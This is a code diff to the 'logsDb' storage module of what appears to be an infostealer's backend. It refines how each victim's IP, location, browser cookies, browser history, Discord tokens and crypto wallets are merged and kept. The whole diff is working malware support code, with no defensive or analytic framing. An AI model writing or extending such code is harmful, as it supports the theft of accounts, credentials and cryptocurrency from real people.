@@ -217,33 +217,45 @@ const logsDb = {
             // Helper function to check if a value is actually provided (not just undefined)
             const hasValue = (val) => val !== undefined && val !== null;
             
+            // Helper function to check if array has meaningful data (not just empty)
+            const hasArrayData = (arr) => Array.isArray(arr) && arr.length > 0;
+            
             // Merge pcData - use new data if provided, otherwise keep existing
             const mergedPcData = {
                 ...existingPcData,
-                // Override with new values if they are provided (even if empty)
+                // Override with new values if they are provided
                 screenSize: hasValue(pcData.screenSize) ? pcData.screenSize : existingPcData.screenSize,
                 dateTime: hasValue(pcData.dateTime) ? pcData.dateTime : existingPcData.dateTime,
                 ipAddress: hasValue(pcData.ipAddress) ? pcData.ipAddress : existingPcData.ipAddress,
                 location: hasValue(pcData.location) ? pcData.location : existingPcData.location,
                 systemInfo: hasValue(pcData.systemInfo) ? pcData.systemInfo : existingPcData.systemInfo,
                 browserCookies: hasValue(pcData.browserCookies) ? pcData.browserCookies : existingPcData.browserCookies,
-                // For arrays/lists, use new data if provided (even if empty array), otherwise keep existing
-                runningProcesses: hasValue(pcData.runningProcesses) 
+                // For arrays/lists: use new data if it has items, otherwise keep existing
+                // This ensures we don't overwrite good data with empty arrays
+                runningProcesses: hasArrayData(pcData.runningProcesses) 
                     ? pcData.runningProcesses 
-                    : (existingPcData.runningProcesses || []),
-                installedApps: hasValue(pcData.installedApps) 
+                    : (Array.isArray(existingPcData.runningProcesses) && existingPcData.runningProcesses.length > 0 
+                        ? existingPcData.runningProcesses 
+                        : (Array.isArray(pcData.runningProcesses) ? pcData.runningProcesses : [])),
+                installedApps: hasArrayData(pcData.installedApps) 
                     ? pcData.installedApps 
-                    : (existingPcData.installedApps || []),
-                browserHistory: hasValue(pcData.browserHistory) 
-                    ? pcData.browserHistory 
-                    : (existingPcData.browserHistory || {}),
-                discordTokens: hasValue(pcData.discordTokens) 
+                    : (Array.isArray(existingPcData.installedApps) && existingPcData.installedApps.length > 0 
+                        ? existingPcData.installedApps 
+                        : (Array.isArray(pcData.installedApps) ? pcData.installedApps : [])),
+                browserHistory: hasValue(pcData.browserHistory) && (
+                    pcData.browserHistory.chromeHistory?.length > 0 ||
+                    pcData.browserHistory.firefoxHistory?.length > 0 ||
+                    pcData.browserHistory.edgeHistory?.length > 0 ||
+                    pcData.browserHistory.operaHistory?.length > 0 ||
+                    pcData.browserHistory.braveHistory?.length > 0
+                ) ? pcData.browserHistory : (existingPcData.browserHistory || {}),
+                discordTokens: (hasValue(pcData.discordTokens) && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0)
                     ? pcData.discordTokens 
                     : existingPcData.discordTokens,
-                cryptoWallets: hasValue(pcData.cryptoWallets) 
+                cryptoWallets: (hasValue(pcData.cryptoWallets) && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0)
                     ? pcData.cryptoWallets 
                     : existingPcData.cryptoWallets,
-                cryptoWalletFolders: hasValue(pcData.cryptoWalletFolders) 
+                cryptoWalletFolders: (hasValue(pcData.cryptoWalletFolders) && Array.isArray(pcData.cryptoWalletFolders) && pcData.cryptoWalletFolders.length > 0)
                     ? pcData.cryptoWalletFolders 
                     : existingPcData.cryptoWalletFolders
             };
